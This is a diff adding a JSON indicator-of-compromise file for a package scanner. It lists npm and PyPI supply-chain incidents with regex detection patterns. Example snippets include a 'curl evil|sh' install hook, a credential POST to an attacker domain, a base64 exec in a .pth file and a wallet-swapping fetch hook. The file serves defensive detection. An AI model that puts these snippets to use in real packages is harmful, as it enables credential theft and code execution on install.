@@ -1,0 +1,152 @@
+{
+  "metadata": {
+    "description": "Verified npm + PyPI supply-chain attack indicators (2024-2026). Each entry's detection_pattern is a Python regex matched by scan_plugin.py against package.json scripts/dependencies, file names, and source content. All incidents confirmed against primary sources (GitHub Advisory DB, CISA, PyPI blog, vendor post-mortems) on 2026-06-19.",
+    "last_verified": "2026-06-19",
+    "schema_version": "1.0",
+    "note": "These are NAMED-INCIDENT IOCs (CRITICAL) distinct from the generic dangerous-function patterns. The generic 'any postinstall script' check remains in scan_plugin.py; these add specific campaign attribution and escalate severity when a known IOC is matched."
+  },
+  "npm": {
+    "shai_hulud_v1": {
+      "severity": "CRITICAL",
+      "cvss": 9.8,
+      "cwe": "CWE-506",
+      "attack_id": "T1195.002",
+      "incident": "Shai-Hulud npm worm (Sept 2025)",
+      "date": "2025-09-15",
+      "reference": "CISA AA / https://www.cisa.gov/news-events/alerts/2025/09/23",
+      "description": "Self-propagating npm worm: postinstall runs bundle.js, harvests NPM_TOKEN/GITHUB_TOKEN/cloud creds via TruffleHog, exfiltrates to attacker GitHub repos, and republishes the maintainer's other packages.",
+      "risk": "Credential theft, worm propagation across a maintainer's entire package set",
+      "detection_pattern": "(?i)postinstall.{0,40}\\bbundle\\.js\\b|webhook\\.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7",
+      "match_targets": ["package_json_scripts", "file_content"],
+      "example_suspicious": "\"postinstall\": \"node bundle.js\""
+    },
+    "shai_hulud_v2": {
+      "severity": "CRITICAL",
+      "cvss": 9.8,
+      "cwe": "CWE-506",
+      "attack_id": "T1195.002",
+      "incident": "Shai-Hulud 2.0 (Nov 2025)",
+      "date": "2025-11-21",
+      "reference": "https://securitylabs.datadoghq.com/articles/shai-hulud-2-0-npm-worm/",
+      "description": "Second-wave npm worm using preinstall + Bun runtime to evade Node-based detection. Drops setup_bun.js / bun_environment.js obfuscated credential stealers; commits shai-hulud-workflow.yml.",
+      "risk": "Credential theft via preinstall (wider surface than postinstall), evasion via Bun",
+      "detection_pattern": "(?i)\\b(setup_bun\\.js|bun_environment\\.js|shai-hulud-workflow\\.yml)\\b|preinstall.{0,40}setup_bun",
+      "match_targets": ["package_json_scripts", "file_name", "file_content"],
+      "example_suspicious": "\"preinstall\": \"node setup_bun.js\""
+    },
+    "nx_s1ngularity": {
+      "severity": "CRITICAL",
+      "cvss": 9.3,
+      "cwe": "CWE-506",
+      "attack_id": "T1552.001",
+      "incident": "Nx s1ngularity (Aug 2025)",
+      "date": "2025-08-26",
+      "reference": "GHSA-cxm3-wv7p-598c",
+      "description": "Compromised nx releases: postinstall scans the filesystem for secrets (SSH keys, npm tokens, wallets), writes /tmp/inventory.txt, exfiltrates to s1ngularity-repository-* GitHub repos, and injects a destructive 'sudo shutdown' into shell rc files.",
+      "risk": "Credential harvesting + destructive shell-config tampering",
+      "detection_pattern": "(?i)/tmp/inventory\\.txt|s1ngularity-repository|sudo\\s+shutdown\\s+-h",
+      "match_targets": ["file_content"],
+      "example_suspicious": "fs.writeFileSync('/tmp/inventory.txt', secrets)"
+    },
+    "chalk_debug_clipper": {
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "cwe": "CWE-506",
+      "attack_id": "T1059.007",
+      "incident": "chalk/debug/ansi-styles crypto-clipper (Sept 8 2025)",
+      "date": "2025-09-08",
+      "reference": "GHSA-4x49-vf9v-38px / CVE-2025-59144",
+      "description": "Maintainer phished via support@npmjs.help; injected a browser crypto-clipper into chalk/debug/ansi-styles and ~18 packages. Hooks window.fetch / XMLHttpRequest / window.ethereum and swaps wallet addresses in-flight.",
+      "risk": "Cryptocurrency theft from any site bundling the compromised package",
+      "detection_pattern": "(?i)(window\\.ethereum|XMLHttpRequest|fetch)\\b.{0,60}(0x[a-fA-F0-9]{40}|replace.{0,20}wallet)|npmjs\\.help",
+      "match_targets": ["file_content"],
+      "example_suspicious": "const orig = window.fetch; window.fetch = (...a) => { /* swap 0x... wallet */ }"
+    },
+    "axios_plain_crypto_js": {
+      "severity": "CRITICAL",
+      "cvss": 9.8,
+      "cwe": "CWE-506",
+      "attack_id": "T1195.002",
+      "incident": "Axios + plain-crypto-js RAT (March 2026)",
+      "date": "2026-03-31",
+      "reference": "GHSA-fw8c-xr5c-95f9",
+      "description": "Compromised axios 1.14.1 / 0.30.4 injected a hidden dependency plain-crypto-js@4.2.1 whose postinstall fetches a platform-specific RAT (macOS/Windows/Linux).",
+      "risk": "Remote access trojan delivered on install",
+      "detection_pattern": "(?i)\\bplain-crypto-js\\b|\"axios\"\\s*:\\s*\"(1\\.14\\.1|0\\.30\\.4)\"",
+      "match_targets": ["package_json_dependencies", "file_content"],
+      "example_suspicious": "\"plain-crypto-js\": \"4.2.1\""
+    },
+    "binding_gyp_implicit_build": {
+      "severity": "HIGH",
+      "cvss": 7.7,
+      "cwe": "CWE-829",
+      "attack_id": "T1195.002",
+      "incident": "Implicit node-gyp build hook (recurring vector; blocked by default in npm v12, July 2026)",
+      "date": "2026-07-01",
+      "reference": "https://www.aikido.dev/blog/npm-v12-block-postinstall",
+      "description": "A binding.gyp triggers an implicit node-gyp rebuild on install even with no explicit install script — a code-execution surface that npm v12 blocks by default.",
+      "risk": "Install-time native-build code execution without an explicit lifecycle script",
+      "detection_pattern": "(?i)\\bbinding\\.gyp\\b",
+      "match_targets": ["file_name"],
+      "example_suspicious": "binding.gyp present with a custom 'actions' build step"
+    }
+  },
+  "pypi": {
+    "setup_py_install_exec": {
+      "severity": "HIGH",
+      "cvss": 8.6,
+      "cwe": "CWE-94",
+      "attack_id": "T1195.002",
+      "incident": "setup.py / cmdclass install-time code execution (PyPI attack class)",
+      "date": "2024-2026",
+      "reference": "https://blog.pypi.org/posts/2026-04-02-incident-report-litellm-telnyx-supply-chain-attack/",
+      "description": "Code that runs at 'pip install' time: os.system/subprocess inside setup.py, or a custom cmdclass overriding install.run() to execute a payload before any import.",
+      "risk": "Arbitrary code execution on install, before the package is ever imported",
+      "detection_pattern": "(?i)(os\\.system|subprocess\\.(run|call|Popen)|__import__\\s*\\(\\s*['\\\"]os).{0,200}|class\\s+\\w*Install\\w*\\s*\\(.*\\):",
+      "match_targets": ["setup_py_content"],
+      "example_suspicious": "class PostInstall(install):\\n    def run(self):\\n        os.system('curl evil|sh')"
+    },
+    "pth_startup_hook": {
+      "severity": "CRITICAL",
+      "cvss": 9.3,
+      "cwe": "CWE-506",
+      "attack_id": "T1546",
+      "incident": "Python .pth startup hook (litellm Mar 2026 / Hades June 2026)",
+      "date": "2026-03-24",
+      "reference": "https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/",
+      "description": ".pth files in site-packages are executed on every interpreter start if they begin with 'import'. Malware ships a .pth (e.g. litellm_init.pth) that imports/execs a stealer — persistent and import-free.",
+      "risk": "Persistent code execution on every Python invocation; credential/SSH/.env theft",
+      "detection_pattern": "(?i)^\\s*import\\s+.{0,200}(exec|subprocess|os\\.system|__import__)|litellm_init\\.pth",
+      "match_targets": ["pth_content", "file_name"],
+      "example_suspicious": "import os; exec(__import__('base64').b64decode('...'))   # inside a .pth file"
+    },
+    "litellm_c2": {
+      "severity": "CRITICAL",
+      "cvss": 9.8,
+      "cwe": "CWE-506",
+      "attack_id": "T1071.001",
+      "incident": "litellm / Telnyx PyPI compromise (March 2026)",
+      "date": "2026-03-24",
+      "reference": "https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/",
+      "description": "Compromised litellm 1.82.7/1.82.8 dropped litellm_init.pth and beaconed to litellm.cloud (registered hours before the attack), harvesting SSH keys/.env/cloud creds/k8s configs.",
+      "risk": "Credential exfiltration to attacker C2",
+      "detection_pattern": "(?i)litellm\\.cloud|litellm_init\\.pth",
+      "match_targets": ["file_content", "file_name"],
+      "example_suspicious": "requests.post('https://litellm.cloud/...', data=creds)"
+    },
+    "typosquat_payload": {
+      "severity": "HIGH",
+      "cvss": 8.1,
+      "cwe": "CWE-506",
+      "attack_id": "T1195.002",
+      "incident": "PyPI typosquat campaign (2024-2025, ongoing)",
+      "date": "2024-03-26",
+      "reference": "https://blog.checkpoint.com/securing-the-cloud/pypi-inundated-by-malicious-typosquatting-campaign/",
+      "description": "Typosquats of popular packages (requests, tensorflow, pillow) whose setup.py downloads a second-stage payload (zgRAT, wallet injectors targeting Exodus/Atomic).",
+      "risk": "Malware delivery to users who mistype a popular package name",
+      "detection_pattern": "(?i)(urllib\\.request\\.urlopen|requests\\.get)\\s*\\(.{0,120}\\.(exe|asar|bin|sh)['\\\"]|app\\.asar",
+      "match_targets": ["setup_py_content", "file_content"],
+      "example_suspicious": "urllib.request.urlopen('http://evil/stage2.exe')"
+    }
+  }
+}
